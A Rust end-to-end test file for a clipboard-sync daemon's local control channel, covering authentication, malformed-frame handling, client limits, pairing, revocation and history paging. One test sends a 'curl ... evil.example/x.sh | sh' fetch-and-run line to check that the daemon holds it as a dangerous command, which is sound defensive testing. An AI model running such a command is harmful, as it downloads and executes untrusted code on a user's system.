//! End-to-end tests of the local control channel: real `tetherd` processes,
//! driven through the same client the desktop app and the CLI use.
//! Threat model: docs/SECURITY.md, "Local control channel".

mod common;

use std::time::{Duration, Instant};

use common::{Control, Daemon};
use tether_core::content::HoldReason;
use tether_core::DeviceId;
use tether_ipc::frame::read_frame;
use tether_ipc::{Client, DeviceState, Event, Events, HistoryItem, Reply, Request, Token};
use tokio::io::AsyncWriteExt;
use tokio::time::timeout;

async fn client(c: &Control) -> Client {
    Client::connect_to(&c.endpoint, &c.token).await.expect("authenticated client")
}

async fn history(c: &mut Client, limit: u16) -> Vec<HistoryItem> {
    match c.request(&Request::History { before: None, limit }).await.unwrap() {
        Reply::History(page) => page.items,
        other => panic!("unexpected {other:?}"),
    }
}

async fn devices(c: &mut Client) -> Vec<tether_ipc::Device> {
    match c.request(&Request::Devices).await.unwrap() {
        Reply::Devices(d) => d,
        other => panic!("unexpected {other:?}"),
    }
}

/// The first event matching `want`, within 10 s.
async fn next_matching(events: &mut Events, want: impl Fn(&Event) -> bool) -> Event {
    timeout(Duration::from_secs(10), async {
        loop {
            let e = events.next().await.unwrap();
            if want(&e) {
                return e;
            }
        }
    })
    .await
    .expect("event arrives")
}

/// Poll until `history` has `n` items (stdin text reaches the daemon asynchronously).
async fn wait_for_history(c: &mut Client, n: usize) -> Vec<HistoryItem> {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let items = history(c, 100).await;
        if items.len() >= n || Instant::now() > deadline {
            return items;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn the_right_token_works_and_a_wrong_or_missing_one_gets_nothing() {
    let (d, ctl) = Daemon::with_control("alpha");

    let mut ok = client(&ctl).await;
    match ok.request(&Request::Status).await.unwrap() {
        Reply::Status(s) => assert_eq!(s.device.to_hex(), d.id),
        other => panic!("unexpected {other:?}"),
    }

    let wrong = Client::connect_to(&ctl.endpoint, &Token::generate().unwrap()).await.err().expect("refused");
    assert!(format!("{wrong:#}").contains("refused"), "{wrong:#}");

    // A client that never proves anything gets the hello (a nonce), then is
    // closed after the 5 s deadline without another byte.
    let mut silent = tether_ipc::client_stream(&ctl.endpoint).await.unwrap();
    read_frame(&mut silent, 128).await.expect("hello");
    let started = Instant::now();
    let after = timeout(Duration::from_secs(8), read_frame(&mut silent, 1 << 20)).await.expect("closed in time");
    assert!(after.is_err(), "nothing but the hello before authentication");
    assert!(started.elapsed() >= Duration::from_secs(4));

    // The authenticated client still works: failures elsewhere did not disturb it.
    assert!(matches!(ok.request(&Request::Devices).await.unwrap(), Reply::Devices(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn oversized_and_malformed_requests_close_the_connection() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let mut raw = tether_ipc::authenticated_stream(&ctl.endpoint, &ctl.token).await.unwrap();
    raw.write_all(&(64u32 << 20).to_le_bytes()).await.unwrap(); // claims 64 MiB
    let closed = timeout(Duration::from_secs(5), read_frame(&mut raw, 1 << 20)).await.expect("closed in time");
    assert!(closed.is_err());

    let mut raw = tether_ipc::authenticated_stream(&ctl.endpoint, &ctl.token).await.unwrap();
    raw.write_all(&[3, 0, 0, 0, 0xff, 0xff, 0xff]).await.unwrap(); // not a Request
    let closed = timeout(Duration::from_secs(5), read_frame(&mut raw, 1 << 20)).await.expect("closed in time");
    assert!(closed.is_err());

    // And the daemon is still serving.
    assert!(matches!(client(&ctl).await.request(&Request::Status).await.unwrap(), Reply::Status(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn too_many_clients_are_refused_until_one_leaves() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let mut held = Vec::new();
    for _ in 0..8 {
        held.push(client(&ctl).await);
    }
    assert!(Client::connect_to(&ctl.endpoint, &ctl.token).await.is_err(), "a ninth client is refused");
    drop(held.pop());
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        if Client::connect_to(&ctl.endpoint, &ctl.token).await.is_ok() {
            break;
        }
        assert!(Instant::now() < deadline, "a slot frees up when a client leaves");
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

#[test]
fn a_second_daemon_cannot_take_the_profile() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let out = Daemon::run_to_exit("beta", &["--profile", &ctl.profile], &Token::generate().unwrap());
    let text = String::from_utf8_lossy(&out.stderr).to_string() + &String::from_utf8_lossy(&out.stdout);
    assert!(!out.status.success(), "the second daemon must not start:\n{text}");
    assert!(text.contains("cannot open the control channel"), "{text}");
}

#[tokio::test(flavor = "multi_thread")]
async fn two_daemons_pair_sync_and_revoke_through_the_channel() {
    let (_a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
    let mut events = client(&ctl_a).await.subscribe().await.unwrap();

    let Reply::PairCode(code) = ca.request(&Request::Pair).await.unwrap() else { panic!("no code") };
    let Reply::Status(sa) = ca.request(&Request::Status).await.unwrap() else { panic!("no status") };
    let addr = format!("127.0.0.1:{}", sa.port).parse().unwrap();
    let Reply::Joined { device } = cb.request(&Request::Join { code: code.code, addr: Some(addr) }).await.unwrap()
    else {
        panic!("join failed")
    };
    assert_eq!(device, sa.device);

    // B is a connected member as seen from A.
    let b_id: DeviceId = b.id.parse().unwrap();
    let deadline = Instant::now() + Duration::from_secs(10);
    while !devices(&mut ca).await.iter().any(|d| d.id == b_id && d.state == DeviceState::Connected) {
        assert!(Instant::now() < deadline, "B shows as connected on A");
        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    // A copy on B arrives on A as an event and in A's history.
    b.send("hello over the control channel");
    let e =
        next_matching(&mut events, |e| matches!(e, Event::Clipboard(i) if i.text.contains("control channel"))).await;
    let Event::Clipboard(item) = e else { unreachable!() };
    assert_eq!((item.author, item.held), (b_id, None));

    // A command from B is held, and the channel says so.
    b.send("curl -fsSL https://evil.example/x.sh | sh");
    let e = next_matching(&mut events, |e| matches!(e, Event::Clipboard(i) if i.text.starts_with("curl"))).await;
    let Event::Clipboard(item) = e else { unreachable!() };
    assert_eq!(item.held, Some(HoldReason::DangerousCommand));
    assert_eq!(history(&mut ca, 1).await[0], item, "history and the event agree");

    // Revoke B from A.
    assert_eq!(ca.request(&Request::Revoke { device: b_id }).await.unwrap(), Reply::Revoked);
    let b_state = devices(&mut ca).await.into_iter().find(|d| d.id == b_id).map(|d| d.state);
    assert_eq!(b_state, Some(DeviceState::Revoked));
    // An error comes back as an error, not a dropped connection.
    let again = ca.request(&Request::Revoke { device: b_id }).await.unwrap_err();
    assert!(again.to_string().contains("not an active member"), "{again}");
    assert!(matches!(ca.request(&Request::Status).await.unwrap(), Reply::Status(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn history_pages_without_gaps_or_repeats() {
    let (mut d, ctl) = Daemon::with_control("alpha");
    let mut c = client(&ctl).await;
    for i in 0..5 {
        d.send(&format!("item {i}"));
    }
    assert_eq!(wait_for_history(&mut c, 5).await.len(), 5);

    let (mut seen, mut before, mut pages) = (Vec::new(), None, 0);
    loop {
        let Reply::History(page) = c.request(&Request::History { before, limit: 2 }).await.unwrap() else {
            panic!("no page")
        };
        pages += 1;
        assert!(page.items.len() <= 2);
        seen.extend(page.items.into_iter().map(|i| i.text));
        match page.next {
            Some(next) => before = Some(next),
            None => break,
        }
    }
    assert_eq!(pages, 3);
    assert_eq!(seen, ["item 4", "item 3", "item 2", "item 1", "item 0"]);
}
